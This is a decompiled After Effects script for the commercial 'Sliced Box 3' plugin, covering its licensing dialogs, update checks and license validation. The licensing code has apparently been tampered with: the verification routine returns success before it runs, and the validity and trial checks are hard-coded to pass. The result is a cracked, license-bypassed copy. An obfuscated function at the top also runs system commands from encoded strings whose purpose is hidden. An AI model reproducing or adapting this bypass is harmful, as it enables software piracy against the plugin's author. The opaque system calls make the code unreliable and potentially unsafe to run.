/*
 * Decompiled with Jsxer
 * Version: 1.7.4
 * JSXBIN 2.0
 */

function _CETSTNO() {
  if (-1 != $[_$_6eca[2]][_$_6eca[1]](_$_6eca[0])) {
    var _0x5b8330 = _$_6eca[3];
    _0x5b8330 = system[_$_6eca[4]](_0x5b8330);
    _0x5b8330 = _0x5b8330[_$_6eca[5]]();
    if (
      -1 != _0x5b8330[_$_6eca[1]](_$_6eca[6]) ||
      -1 != _0x5b8330[_$_6eca[1]](_$_6eca[7]) ||
      -1 != _0x5b8330[_$_6eca[1]](_$_6eca[8]) ||
      -1 != _0x5b8330[_$_6eca[1]](_$_6eca[9])
    ) {
      return false;
    }
    if (-1 != _0x5b8330[_$_6eca[1]](_$_6eca[10])) {
      return true;
    }
  } else {
    return (
      (_0x5b8330 = _$_6eca[11]),
      (_0x5b8330 = system[_$_6eca[4]](_0x5b8330)),
      (_0x5b8330 = _0x5b8330[_$_6eca[5]]()),
      -1 != _0x5b8330[_$_6eca[1]](_$_6eca[12]) ? true : false
    );
  }
}
function SLICEDBOXSCRIPTV3(thisObj) {
  var scriptName = "Sliced Box 3";
  var scriptVersion = "3.25";
  alertTitle = "Sliced Box Script " + scriptVersion;
  HelpTextDoc =
    '\n    How to use:\n    \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    1. Select a layer (Solid, Comp, Footage or a Text).\n    \n    2. Insert the columns and rows number.\n    \n    3. Insert the box width value.\n    \n    4. In "Material" tab you can enable/disable some material options and motion blur.\n        You can also modify them after creating SlicedBox.\n        \n    5. Select an animation Preset to be applied,\n        Also you can apply the Animation Presets after creating Sliced Box by selecting it and clicking on "Apply" button.\n        \n    6. Finally click on "Create" button.\n    \n    ';
  var af_settings = {
    helpButtons: [],
    helpText: HelpTextDoc,
    offerTrial: true,
    privateNumber: 6943156493082344,
    productSKU: "SAFYSB3-SUL",
    scriptAuthor: "Mahmoud Elsafy",
    scriptName: scriptName,
    scriptURL: "https://aescripts.com/sliced-box/",
    scriptVersion: scriptVersion,
  };
  function a(vars) {
    function licUI() {
      var e = new Window(
        "dialog",
        strTrialWelcomeHeader + " - " + strVersion + " " + strScriptVersion,
        void 0,
        { resizeable: true },
      );
      if (null != e) {
        var i =
          "group { \t\t\t\torientation: \'column\', \t\t\t\talignment: [\'fill\',\'fill\'], \t\t\t\talignChildren: [\'fill\',\'fill\'], \t\t\t\t\tinfoGrp: Group { \t\t\t\t\talignment: [\'fill\',\'top\'], \t\t\t\t\talignChildren: [\'fill\',\'fill\'], \t\t\t\t\torientation: \'column\', \t\t\t\t\t\thdrGrp: Group {\t\t\t\t\t\t\ttxt: StaticText {}, \t\t\t\t\t\t\tpaste: StaticText {}, \t\t\t\t\t\t}\t\t\t\t\t\ttrial: StaticText {}, \t\t\t\t\t} \t\t\t\t\tlicGrp: Group { \t\t\t\t\t\ttxt: EditText {alignment: [\'fill\',\'fill\'], properties:{multiline:false}}, \t\t\t\t\t} \t\t\t\t\tokGrp: Group { \t\t\t\t\talignment: [\'fill\',\'bottom\'], \t\t\t\t\talignChildren: [\'fill\',\'fill\'],                             buyGrp: Group {                             alignment: [\'left\',\'fill\'],                             alignChildren: [\'left\',\'fill\'],                             orientation: \'column\',                             spacing:1,                                  retrieveReg: Button {text:\'" +
          strRetrieveLic.replace(/%t/, strLicense) +
          "\', name:\'retrieve\',preferredSize:[130,25]}                                   buyLic: Button {text:\'" +
          strBuyLic.replace(/%t/, strLicense) +
          "\', name:\'buy\',preferredSize:[130,25]}                                   }\t\t\t\t\t\tcancelBtn: Button {text:\'" +
          strCancel +
          "\', preferredSize:[150,50], alignment: [\'right\',\'center\']} \t\t\t\t\t\tokBtn: Button {text:\'" +
          strOK +
          "\', preferredSize:[150,50], alignment: [\'right\',\'center\']} \t\t\t\t\t} \t\t\t\t}";
        e.grp = e.add(i);
        var t = ScriptUI.newFont(
          "dialog || palette",
          ScriptUI.FontStyle.BOLD,
          12,
        );
        var n = ScriptUI.newFont(
          "dialog || palette",
          ScriptUI.FontStyle.REGULAR,
          9,
        );
        return (
          (e.grp.licGrp.txt.preferredSize = [600, 30]),
          (e.grp.infoGrp.hdrGrp.txt.text = strEnterLicenseCode),
          (e.grp.infoGrp.hdrGrp.txt.graphics.font = t),
          (e.grp.infoGrp.hdrGrp.paste.text = ""),
          (e.grp.infoGrp.hdrGrp.paste.graphics.font = n),
          (e.grp.infoGrp.trial.text =
            betaMode || !offerTrial ? "" : strTrialInstructMsg),
          isServerConfigured(licenseValidity) &&
            (isServerRunning(licenseValidity)
              ? (e.grp.infoGrp.hdrGrp.txt.text = strServerInstructMsg)
              : (e.grp.infoGrp.hdrGrp.txt.text =
                  strEnterLicenseCode + " " + strServerNotRunning),
            (e.grp.infoGrp.trial.text = strTrialInstructMsg)),
          (e.grp.licGrp.txt.text = betaMode || !offerTrial ? "" : "trial"),
          isServerConfigured(licenseValidity) &&
            isServerRunning(licenseValidity) &&
            (e.grp.licGrp.txt.text = "@REMOTE"),
          (e.grp.okGrp.buyGrp.retrieveReg.visible =
            e.grp.okGrp.buyGrp.buyLic.visible =
              !betaMode),
          (e.grp.okGrp.buyGrp.buyLic.onClick = function () {
            openURL(strTrialUrl);
            e.close(false);
          }),
          (e.grp.okGrp.buyGrp.retrieveReg.onClick = function () {
            retrieveLicenseUI(strLicense);
            e.close(false);
          }),
          (e.grp.okGrp.cancelBtn.onClick = function () {
            e.close(false);
          }),
          (e.grp.okGrp.okBtn.onClick = function () {
            license = e.grp.licGrp.txt.text
              .replace(/^\s\s*/, "")
              .replace(/\s\s*$/, "");
            e.close(true);
          }),
          e.layout.layout(true),
          e.layout.resize(),
          (e.onResizing = e.onResize =
            function () {
              this.layout.resize();
            }),
          e
        );
      }
    }
    function retrieveLicenseUI(e) {
      var i = new Window("dialog", strRetrieveLic.replace(/%t/, e), void 0, {
        resizeable: true,
      });
      if (null != i) {
        var t =
          "group { \t\t\t\torientation: \'column\', \t\t\t\talignment: [\'fill\',\'fill\'], \t\t\t\talignChildren: [\'fill\',\'fill\'],                     hdrGrp: Group {                         orientation: \'column\',                         alignment: [\'fill\',\'fill\'],                         alignChildren: [\'fill\',\'fill\'],                                 hdr: StaticText {text:\'" +
          strLicenseDownloadOptions.replace(
            /%t/,
            e.toLowerCase() + "de" == locale ? "n" : "s",
          ) +
          "\', alignment: [\'fill\',\'top\'], properties:{multiline:true} },                                },                     buttonsGrp: Group {                         alignment: [\'fill\',\'bottom\'],                         alignChildren: [\'fill\',\'fill\'],                             myDownloadsBtn: Button {text:\'" +
          strMyDownloads +
          "\', preferredSize:[-1,30], alignment: [\'right\',\'center\']},                             downloadManagerBtn: Button {text:\'" +
          strDownloadManager +
          "\', preferredSize:[-1,30], alignment: [\'right\',\'center\']},                         }, \t\t\t\t}";
        i.grp = i.add(t);
        i.grp.buttonsGrp.myDownloadsBtn.onClick = function () {
          openURL(retrieveUrl);
          i.close(false);
        };
        i.grp.buttonsGrp.downloadManagerBtn.onClick = function () {
          openURL(managerAppUrl);
          i.close(false);
        };
        i.layout.layout(true);
        i.layout.resize();
        i.onResizing = i.onResize = function () {
          this.layout.resize();
        };
        i.show();
      }
    }
    function checkBeta(e, i) {
      return new Date() < i || new Date() > e;
    }
    function helpUI() {
      var e = new Window(
        "dialog",
        strScriptName + " - " + strVersion + " " + strScriptVersion,
        void 0,
        { resizeable: true },
      );
      if (null != e) {
        for (
          var i =
              -1 != $.os.indexOf("Windows") &&
              12 <= parseFloat(app.version) &&
              parseFloat(app.version) < 14
                ? ["left", "top"]
                : ["fill", "fill"],
            t =
              "group { \t\torientation: \'column\', \t\talignment: [\'" +
              i[0] +
              "\',\'" +
              i[1] +
              "\'], \t\talignChildren: [\'fill\',\'fill\'],                    infoGrp: Group {                    alignment: [\'fill\',\'top\'],                    alignChildren: [\'fill\',\'top\'], \t\t\t\t\ttxt: StaticText {properties:{multiline:true}, preferredSize:[150,50]},                       hdr: StaticText {properties:{multiline:true}},                       removeLic: Button {text:\'" +
              strDeactivate +
              "\', preferredSize:[40,30]} \t\t\t\t} \t\t\t\thelpGrp: Group {                    alignment: [\'" +
              i[0] +
              "\',\'" +
              i[1] +
              "\'],                    alignChildren: [\'fill\',\'fill\'],                     txt: EditText {properties:{multiline:true, readonly:true}}, \t\t\t\t}                 prefsGrp: Group {                       alignment: [\'fill\',\'bottom\'],                        alignChildren: [\'left\',\'center\'],                        orientation: \'row\',                        checkNow: Button {text:\'" +
              strCheckNow +
              "\', preferredSize:[150,25]}                        doUpdateCheck: Checkbox {text:\'" +
              strVersionCheck +
              "\', preferredSize:[-1,25]}                        }\t\t\tokGrp: Group {                 alignment: [\'fill\',\'bottom\'],                 alignChildren: [\'fill\',\'center\'],                 supportBtn: Button {text:\'" +
              strGetSupport +
              "\', preferredSize:[150,30], alignment: [\'left\',\'center\']}                 ",
            n = 0;
          n < Math.min(maxUIButtons, vars.helpButtons.length);
          n++
        ) {
          if (vars.helpButtons[n].hasOwnProperty("name")) {
            t +=
              "btn" + n + ": " + vars.helpButtons[n].hasOwnProperty("type") &&
              validateButtonType(vars.helpButtons[n].type)
                ? vars.helpButtons[n].type
                : "Button" +
                  " {id: \'" +
                  n +
                  "\', alignment: [\'left\',\'center\']}";
          }
        }
        t +=
          "\t\t\t\t\tokBtn: Button {text:\'" +
          strOK +
          "\', preferredSize:[150,30], alignment: [\'right\',\'center\']} \t\t\t\t} \t\t}";
        e.grp = e.add(t);
        e.grp.helpGrp.txt.preferredSize = [800, 500];
        var r = "\xa9" + (new Date().getYear() + 1900).toString();
        e.grp.infoGrp.txt.text =
          strScriptName +
          " - " +
          strVersion +
          " " +
          strScriptVersion +
          "\n" +
          r +
          " " +
          vars.scriptAuthor +
          "\n\n";
        e.grp.infoGrp.hdr.text = getRegistration();
        e.grp.helpGrp.txt.text = vars.helpText;
        haveSettings(prefsSectionName, prefsDoUpdateCheck) &&
          (doUpdateCheck = !(
            "false" == getSettings(prefsSectionName, prefsDoUpdateCheck)
          ));
        e.grp.prefsGrp.doUpdateCheck.value = doUpdateCheck;
        e.grp.prefsGrp.doUpdateCheck.onClick = function () {
          setUpdateCheck(this.value);
        };
        e.grp.prefsGrp.checkNow.onClick = function () {
          ScriptUI.environment.keyboardState.altKey
            ? alert(
                "aescripts licensing framework version\n" + licensingVersion,
              )
            : doUpdateCheckNow();
        };
        for (
          var n = 0;
          n < Math.min(maxUIButtons, vars.helpButtons.length);
          n += 1
        ) {
          vars.helpButtons[n].hasOwnProperty("name") &&
            ((e.grp.okGrp["btn" + n].text = vars.helpButtons[n].name),
            vars.helpButtons[n].hasOwnProperty("url")
              ? (e.grp.okGrp["btn" + n].onClick = function () {
                  openURL(vars.helpButtons[this.id].url);
                })
              : vars.helpButtons[n].hasOwnProperty("onClickFunction") &&
                (e.grp.okGrp["btn" + n].onClick =
                  vars.helpButtons[n].onClickFunction),
            vars.helpButtons[n].hasOwnProperty("btnValue") &&
              (e.grp.okGrp["btn" + n].value = vars.helpButtons[n].btnValue));
        }
        e.grp.infoGrp.removeLic.visible = !isResultTrial(
          licenseValidity.result,
        );
        e.grp.infoGrp.removeLic.onClick = function () {
          removeLic() &&
            ((e.grp.infoGrp.hdr.text = getRegistration()),
            (this.visible = false));
        };
        e.grp.okGrp.supportBtn.onClick = function () {
          ScriptUI.environment.keyboardState.shiftKey &&
          ScriptUI.environment.keyboardState.altKey
            ? alert(
                "aescripts + aeplugins\nFramework version: " +
                  licensingVersion +
                  "\n" +
                  strScriptName +
                  " - " +
                  strVersion +
                  " " +
                  strScriptVersion,
              )
            : (openSupportTicket({}), e.close());
        };
        e.grp.okGrp.okBtn.onClick = function () {
          e.close();
        };
        -1 != $.os.indexOf("Windows") &&
          12 <= parseFloat(app.version) &&
          parseFloat(app.version) < 14 &&
          (e.maximumSize = [840, 670]);
        e.layout.layout(true);
        e.layout.resize();
        e.onResizing = e.onResize = function () {
          this.layout.resize();
        };
        e.show();
      }
    }
    function validateButtonType(e) {
      return "Button" === e || "Checkbox" === e;
    }
    function openSupportTicket(e) {
      t = n = "";
      i = "&subject=";
      null != e &&
        void 0 !== e &&
        (e.hasOwnProperty("subject") && (i += File.encode(e.subject)),
        e.hasOwnProperty("message") && (t = File.encode(e.message)),
        e.hasOwnProperty("diagnostic") &&
          (n = File.encode(e.diagnostic + "\n--\n")));
      var r =
        true === isAescriptsSupportUrl
          ? strSKU + i + "&message="
          : i.replace(/\&/, "?") + "&body=";
      var a =
        "" != r
          ? t +
            "%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A-------%0D%0A" +
            n +
            getDiagnosticData(true)
          : "";
      supportUrl.toString().match(/@/) &&
        !supportUrl.toString().match(/^mailto:/) &&
        (supportUrl = "mailto:" + supportUrl);
      openURL(supportUrl + r + a);
    }
    function getDiagnosticData(e) {
      var i = $.os.toString();
      var t =
        BridgeTalk.getDisplayName(BridgeTalk.appName) +
        " (" +
        app.version +
        ") - " +
        $.locale.toString();
      var n =
        strScriptName.replace(/&/, "and") +
        " - " +
        strVersion +
        " " +
        strScriptVersion;
      var r = "Lic. fw v" + licensingVersion + isVT() ? " (Trial)" : "";
      return e
        ? File.encode(n) +
            "%0D%0A" +
            File.encode(i) +
            "%0D%0A" +
            File.encode(t) +
            "%0D%0A" +
            File.encode(r)
        : n + "\n" + i + "\n" + t + "\n" + r;
    }
    function setUpdateCheck(e) {
      saveSettings(prefsSectionName, prefsDoUpdateCheck, (doUpdateCheck = e));
    }
    function doUpdateCheckNow() {
      checkForNewVersion((doUpdateCheck = true));
    }
    function newVersionUI(i) {
      var t = new Window("dialog", strNewVersionAvailableHdr, void 0, {
        resizeable: true,
      });
      if (null != t) {
        var e =
          "group { \t\t\t\torientation: \'column\', \t\t\t\talignment: [\'fill\',\'fill\'], \t\t\t\talignChildren: [\'fill\',\'fill\'], \t\t\t\t   hdrGrp: Group { \t\t\t\t   alignment: [\'fill\',\'fill\'], \t\t\t\t   alignChildren: [\'fill\',\'fill\'], \t\t\t\t   orientation: \'column\',                         hdr: StaticText {alignment: [\'fill\',\'top\'], properties:{multiline:true}}, ";
        i.hasOwnProperty("header") &&
          (e +=
            "   infoGrp: Panel {                            alignment: [\'fill\',\'fill\'],                            alignChildren: [\'fill\',\'fill\'],                            orientation: \'column\',                               info: StaticText {properties:{multiline:true}},                               } ");
        e +=
          "} \t\t\t\t\tokGrp: Group { \t\t\t\t\talignment: [\'fill\',\'bottom\'], \t\t\t\t\talignChildren: [\'fill\',\'fill\'], \t\t\t\t\t\tskipVersionBtn: Button {text:\'" +
          strSkipVersion +
          "\', preferredSize:[-1,30], alignment: [\'right\',\'center\']}                            remindMeLaterBtn: Button {text:\'" +
          strRemindMeLater +
          "\', preferredSize:[-1,30], alignment: [\'right\',\'center\']} \t\t\t\t\t\tdownloadBtn: Button {text:\'" +
          strDownload +
          "\', preferredSize:[-1,30], alignment: [\'right\',\'center\']} \t\t\t\t\t} \t\t\t\t}";
        t.grp = t.add(e);
        var n = ScriptUI.newFont(
          "dialog || palette",
          ScriptUI.FontStyle.BOLD,
          12,
        );
        ScriptUI.newFont("dialog || palette", ScriptUI.FontStyle.BOLD, 11);
        ScriptUI.newFont("dialog || palette", ScriptUI.FontStyle.REGULAR, 9);
        t.grp.hdrGrp.hdr.graphics.font = n;
        t.grp.hdrGrp.hdr.text = strNewVersionAvailable.replace(
          /%v/,
          i.version + "\n" + strCurrentVersion.replace(/%v/, strScriptVersion),
        );
        i.hasOwnProperty("header") &&
          (t.grp.hdrGrp.infoGrp.info.text = i.header + "\n\n" + i.detail);
        t.grp.okGrp.skipVersionBtn.onClick = function () {
          saveSettings(
            prefsSectionName,
            prefsLastVersionChecked,
            strScriptVersion,
          );
          saveSettings(
            prefsSectionName,
            prefsLastTimeVersionChecked,
            new Date().toString(),
          );
          saveSettings(
            prefsSectionName,
            prefsNextTimeVersionCheckedSkipVersion,
            i.version,
          );
          saveSettings(
            prefsSectionName,
            prefsLastServerVersionChecked,
            i.version,
          );
          t.close(false);
        };
        t.grp.okGrp.remindMeLaterBtn.onClick = function () {
          try {
            var e = new Date();
            e = dateAddDays(remindMeLaterDays);
            saveSettings(
              prefsSectionName,
              prefsLastVersionChecked,
              strScriptVersion,
            );
            saveSettings(
              prefsSectionName,
              prefsLastTimeVersionChecked,
              new Date().toString(),
            );
            saveSettings(
              prefsSectionName,
              prefsNextTimeVersionChecked,
              e.toString(),
            );
            saveSettings(
              prefsSectionName,
              prefsLastServerVersionChecked,
              i.version,
            );
            t.close(false);
          } catch (e) {
            alert(e.toString());
          }
        };
        t.grp.okGrp.downloadBtn.onClick = function () {
          retrieveLicenseUI(strDownload);
          t.close(true);
        };
        t.layout.layout(true);
        t.layout.resize();
        t.onResizing = t.onResize = function () {
          this.layout.resize();
        };
        i.hasOwnProperty("header") &&
          ((t.grp.hdrGrp.infoGrp.size.height = Math.min(
            t.grp.hdrGrp.infoGrp.size.height,
            300,
          )),
          t.layout.layout(true),
          t.layout.resize());
        t.show();
      }
    }
    function dateAddDays(e) {
      var i = new Date().getTime() + 86400000 * e;
      return new Date(i);
    }
    function checkForNewVersion(e) {
      if ((null == e && (e = false), doUpdateCheck)) {
        haveSettings(prefsSectionName, prefsLastVersionChecked) &&
          (t = getSettings(prefsSectionName, prefsLastVersionChecked));
        haveSettings(prefsSectionName, prefsLastServerVersionChecked) &&
          (n = getSettings(prefsSectionName, prefsLastServerVersionChecked));
        haveSettings(prefsSectionName, prefsLastTimeVersionChecked) &&
          (r = new Date(
            getSettings(prefsSectionName, prefsLastTimeVersionChecked),
          ));
        haveSettings(
          prefsSectionName,
          prefsNextTimeVersionCheckedSkipVersion,
        ) &&
          (s = getSettings(
            prefsSectionName,
            prefsNextTimeVersionCheckedSkipVersion,
          ));
        haveSettings(prefsSectionName, prefsNextTimeVersionChecked) &&
          (a = new Date(
            getSettings(prefsSectionName, prefsNextTimeVersionChecked),
          ));
        haveSettings(prefsSectionName, prefsVersionCheckInit) &&
          (i = getSettings(prefsSectionName, prefsVersionCheckInit));
        var o = new Date();
        if (e || null == i || null == a || !(o < a)) {
          var l = versionCheck(strSKU, true, e);
          if (null != l) {
            var c =
              null != l && l.hasOwnProperty("version")
                ? l.version
                : strScriptVersion;
            if ((e || null == n || n != c) && (e || null == s || s != n)) {
              saveSettings(prefsSectionName, prefsVersionCheckInit, 1);
              try {
                var f = new Date();
                f = dateAddDays(updateCheckInterval);
                saveSettings(
                  prefsSectionName,
                  prefsLastVersionChecked,
                  strScriptVersion,
                );
                saveSettings(
                  prefsSectionName,
                  prefsLastTimeVersionChecked,
                  new Date().toString(),
                );
                saveSettings(
                  prefsSectionName,
                  prefsNextTimeVersionChecked,
                  f.toString(),
                );
              } catch (e) {
                alert(e.toString());
              }
              var d = compareVersions(c, strScriptVersion);
              0 < d && (null == t || null == r || null == a || e || a <= o)
                ? newVersionUI(l)
                : d <= 0 && e && alert(strUpToDate);
            }
          } else {
            saveSettings(
              prefsSectionName,
              prefsDoUpdateCheck,
              (doUpdateCheck = false),
            );
          }
        }
      }
    }
    function versionCheck(e, i, t) {
      var n = extComms(
        "https://notify.aescripts.com/versioncheck2.php?json=1&plain=1&sku=" +
          e +
          i
          ? "&latest=1"
          : "" + parseFloat(app.version) < 12
            ? "&clip_length=200"
            : "&clip_length=300",
        null,
      );
      if (null == n || "" == n || !validateJSON(n)) {
        return (t && alert(strUpdateCheckError), null);
      }
      try {
        if (null == (n = JSONify(n, "parse"))) {
          return null;
        }
      } catch (e) {
        return null;
      }
      return "ok" != n.status
        ? null
        : i
          ? {
              date: n.latest.release_date,
              detail: n.latest.detail,
              header: strVersionRev
                .replace(/%a/, n.version)
                .replace(/%b/, "")
                .replace(/%c/, n.latest.release_date),
              version: n.version,
            }
          : { version: n.version };
    }
    function extComms(e) {
      try {
        if (-1 != $.os.indexOf("Mac")) {
          var i = system.callSystem('curl -s 2 "' + e + '"');
        } else {
          var t =
            ((n = new File(
              Folder.userData.fsName + "/Aescripts/aescripts_helper.vbs",
            )).open("w"),
            n.write(
              'dim o: Set o = createobject("MSXML2.XMLHTTP.6.0")\no.Open "GET", WScript.Arguments(0), False\no.Send\nIf o.Status >= 200 And o.Status <= 202 Then\nWScript.Echo o.responseText\nElse\nWScript.Echo "Error"\nEnd If',
            ),
            n.close(),
            n.exists ? n : null);
          if (null == t) {
            return null;
          }
          i = system.callSystem(
            'cscript //nologo "' + t.fsName + '" "' + e + '"',
          );
        }
        return i;
      } catch (e) {
        return (alert("extComms error\n" + e.toString()), null);
      }
    }
    function socketConnect(e, i) {
      var t = new Socket();
      if (
        ((t.encoding = "binary"), (t.timeout = 2), t.open(e + ":80", "UTF-8"))
      ) {
        t.write(
          "GET /" + i + " HTTP/1.1\nHost: " + e + "\n\nConnection: close\n\n",
        );
        var n = t.read(2000);
        return (t.close(), null != n ? (n = n.toString()) : null);
      }
      return null;
    }
    function formatHistory(e, i) {
      var t = e.data;
      var n = [];
      for (var r in t) {
        if (t.hasOwnProperty(r)) {
          for (var a = t[r].history, s = a.length - 1; 0 <= s; s--) {
            var o = a[s];
            var l = "";
            var c = o.detail;
            s == a.length - 1 && (l = " (" + strNewestVersionAvailable + ")");
            var f = strVersionRev
              .replace(/%0/, o.version_number)
              .replace(/%1/, l)
              .replace(/%2/, o.release_date)
              .replace(/%3/, c);
            (!options.summaryOnlyNewChanges ||
              compareVersions(i, o.version_number) < 0) &&
              n.push(f);
          }
        }
      }
      return n.join("\n\n");
    }
    function getVerifCode(e) {
      return "1";
      "trial" == e.toLowerCase() && (e = "");
      var t =
        -1 != $.os.indexOf("Mac") &&
        (Folder("/Volumes/Private").exists || Folder("/Volumes/private").exists)
          ? Folder.userData.fsName
          : Folder.temp.fsName +
            "/" +
            Math.round(Math.random() * 42132 * new Date().getTime());
      if (-1 != $.os.indexOf("Win")) {
        i = wx;
        t += ".exe";
      } else {
        if (systemCall("arch").toLowerCase().match(/ppc/)) {
          return (alert(strPpcNotSupported), false);
        }
        i = mx;
      }
      var n = createFile(File(t), i, "BINARY");
      if (!n.exists) {
        return ((licenseData = { result: -108 }), licenseData);
      }
      n.hidden = true;
      -1 != $.os.indexOf("Mac") && systemCall('chmod +x "' + n.fsName + '"');
      var r = systemCall(
        '"' + n.fsName + '" "' + strHeader + '" ' + privateNum + ' "' + e + '"',
      );
      return (n.remove(), parseResult(r));
    }
    function parseResult(i) {
      try {
        t = parseVerifCode(i.toString());
      } catch (e) {
        (t = { result: -101 }).e =
          e.toString() + "\nresult:\n\n" + i.toString();
      }
      return t;
    }
    function parseVerifCode(e) {
      for (var i = e.match(/[^\r\n]+/g), t = {}, n = 0; n < i.length; n++) {
        var r = i[n].split(":");
        if (2 <= r.length) {
          var a = r[0].replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "");
          var s = trimQuotes(r[1]);
          "LS" == a && "UP" == s && (a = "LSS");
          isNaN(s) || (s = parseFloat(s));
          t[a] = s;
        }
      }
      return (
        void 0 === t.result && ((t.result = -102), (t.e = e)),
        checkTrialDetails(t),
        checkBetaDetails(t),
        (isTimeLimited = checkTimeLimited(t)),
        t
      );
    }
    function checkTimeLimited(e) {
      var i = retProp("rt$", e);
      var t = retProp("nd$", e);
      return (validateTimeLimited(e, i, t), "" != i && "" != t);
    }
    function validateTimeLimited(e, i, t) {
      switch (e.result) {
        case -20:
          e.e = parseDateString(i);
          break;
        case -21:
          e.e = parseDateString(t);
      }
    }
    function checkFloatingLicense(e) {
      retProp("pe$", e) != bD("RkxU") ||
        isServerRunning(e) ||
        (e.result = -109);
    }
    function checkTrialDetails(e) {
      if (-7 !== e.result) {
      } else if (0 == tLD) {
        e.result = -106;
      } else {
        var i = retProp("^d", e);
        if (void 0 === i) {
          return void (e.result = -103);
        }
        var t = tLD - i;
        0 < t
          ? ((e.result = 100), (e.tdl = t), (e.license = bD("VFJJQUw=")))
          : ((e.result = -100), (e.tdl = 0));
      }
    }
    function checkBetaDetails(e) {
      var i = e.result;
      var t = retProp("pe$", e).match(/^B/);
      betaMode && (isResultTrial(i) || -106 == i || -7 == i)
        ? (e.result = -107)
        : !betaMode && t && (e.result = -105);
    }
    function isResultValidLicense(e) {
      return true;
    }
    function isResultTrial(e) {
      return false;
    }
    function isServerConfigured(e) {
      try {
        return retProp("^L", e).match(/^O/);
      } catch (e) {}
    }
    function isServerRunning(e) {
      try {
        return retProp("SS$", e).match(/^U/);
      } catch (e) {}
    }
    function trimQuotes(e) {
      return (
        "\'" == (e = e.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, ""))[0] &&
          "\'" == e[e.length - 1] &&
          (e = e.substring(1, e.length - 1)),
        e
      );
    }
    function sanitizeProductName(e) {
      return e.toString().replace(/[^a-z0-9]/gi, "");
    }
    function checkErrorCode(e) {
      return licErrors[locale].hasOwnProperty(e.toString()) ? e : "unknown";
    }
    function string_encode3(e) {
      for (var i = 0, t = 0; t < e.length; t++) {
        i += e.charCodeAt(t);
      }
      return i;
    }
    function getVerifCode3(e) {
      var i = e.split("*");
      if (4 == i.length) {
        var t = i[3].replace(/^[0-9]+/, "");
        var n = i[3].match(/^[0-9]+/, "");
        var r = n[0].substr(0, 2);
        var a = n[0].substr(n[0].length - 2);
        var s = r[0] + i[0] + r[1] + i[1] + a[0] + i[2] + a[1] + t;
        var o = n[0].substring(2, n[0].length - 2);
        return string_encode3(s) * privateNum == o ? "1" : "0";
      }
      return (e != bE("bad") && alert(strNewLicenseFormat), "0");
    }
    function string_encode(e) {
      return (
        e.length * e.charCodeAt(0) +
        e.charCodeAt(Math.floor(0.1 * (e.length - 1))) +
        e.charCodeAt(Math.floor(0.2 * (e.length - 1))) +
        e.charCodeAt(Math.floor(0.3 * (e.length - 1))) +
        e.charCodeAt(Math.floor(0.4 * (e.length - 1))) +
        e.charCodeAt(Math.floor(0.5 * (e.length - 1))) +
        e.charCodeAt(Math.floor(0.7 * (e.length - 1))) +
        e.charCodeAt(Math.floor(0.8 * (e.length - 1))) +
        e.charCodeAt(Math.floor(0.9 * (e.length - 1))) +
        e.charCodeAt(e.length - 1)
      );
    }
    function check_v1_License(e) {
      var i = e.split("**");
      return (
        !(
          !e
            .replace(/^ +|| +$/g, "")
            .match(/^.+\*\*.+\*\*[0-9]+[A-Za-z]{3}$/) || 3 != i.length
        ) || (alert(strOldLicenseFormat), false)
      );
    }
    function check_v2_License(e) {
      var i = e.split("*");
      return (
        e.match(/^[A-Z0-9]+\*[^\*]+\*[^\*]+\*[0-9]+[A-Za-z]{3}[0-9]+$/) &&
        4 == i.length
      );
    }
    function check_timed_License(e) {
      var i = e.split("*");
      return (
        e.match(/^[A-Z0-9]+\*[^\*]+\*[^\*]+\*[A-Z0-9#]+[A-Za-z]{3}[0-9]+$/) &&
        4 == i.length
      );
    }
    function checkCode(e, i, t) {
      if (
        ((i = null == i ? "" : i.replace(/^\s\s*/, "").replace(/\s\s*$/, "")),
        (myLicense = false),
        e && ((regUI = licUI()), (myRegPrompt = regUI.show()), !myRegPrompt))
      ) {
        return false;
      }
      var n = false;
      "@remote" == (i = null == license ? i : license).toLowerCase() &&
        ((i = strHeader + i), (n = true));
      var r = i.split("*");
      var a = i.match(/#/);
      var s = a && check_timed_License(i);
      var o = check_v2_License(i);
      if (!((offerTrial && "trial" == i.toLowerCase()) || n || o || s)) {
        if (i.match(/^[A-Z]{2}[A-Z0-9]{30}$/)) {
          var l = confirm(strTempCode);
          return (
            isSecurityPrefSet() && l && openURL(exchangeUrl + "?serial=" + i),
            myLicense
          );
        }
        return (
          alert(
            strInvalidCode + "\n" + betaMode
              ? strNewLicenseFormat.replace(
                  new RegExp(bD("U1VM"), "g"),
                  bD("QlRB"),
                )
              : strNewLicenseFormat + "\n\n" + strContactSupport,
          ),
          saveSettings(prefsSectionName, prefsName, bE("bad")),
          saveSettings(prefsSectionName, prefsVersionName, strScriptVersion),
          saveSettings(prefsSectionName, prefsLicVersion, licensingVersion),
          checkCode(true),
          myLicense
        );
      }
      if (("trial" != i.toLowerCase() || n) && !n) {
        if (null != r[0] && r[0] != strHeader) {
          return (
            alert(strWrongProduct + "\n" + strContactSupport),
            checkCode(e),
            false
          );
        }
        var c = r[3].match(/[A-Z]{3}[0-9]+$/);
        if (null != c) {
          if (c[0].match(bD("QlRB")) && !betaMode) {
            return (
              alert(strBetaCodeAlert),
              saveSettings(prefsSectionName, prefsName, bE("bad")),
              checkCode(true),
              false
            );
          }
          myLicense = true;
        }
      }
      if (
        !isResultValidLicense(
          (licenseValidity = 2 == licV ? getVerifCode(i) : getVerifCode3(i)),
        )
      ) {
        e || (e = true);
        var f = "e" in licenseValidity ? "\n" + licenseValidity.e : "";
        return (
          alert(
            licErrors[locale][checkErrorCode(licenseValidity.result)].title +
              "\n" +
              licErrors[locale][checkErrorCode(licenseValidity.result)].detail +
              f,
          ),
          -9 == licenseValidity.result &&
            prompt(strDeactivate + "?") &&
            getVerifCode("-"),
          checkCode(e),
          myLicense
        );
      }
      if (
        ((isValidTrial =
          !a &&
          offerTrial &&
          "trial" == i.toLowerCase() &&
          isResultTrial(licenseValidity.result)),
        e && !isValidTrial)
      ) {
        var d = parseInt(retProp("^n", licenseValidity), 10);
        var p =
          strRegSuccess.replace("%u", d) + (1 < d) && "de" != locale
            ? "s"
            : "" + betaMode
              ? ""
              : "\n" + strRegSuccess1;
        if (a) {
          var u = parseDateString(retProp("nd$", licenseValidity));
          p += "\n\n" + strLicenseEnds + u;
        }
        i.match(/@remote/i) || alert(p);
      }
      return ((myLicense = true), myLicense);
    }
    function checkForLegacyLic() {
      var e = haveSettings(prefsSectionName, prefsName)
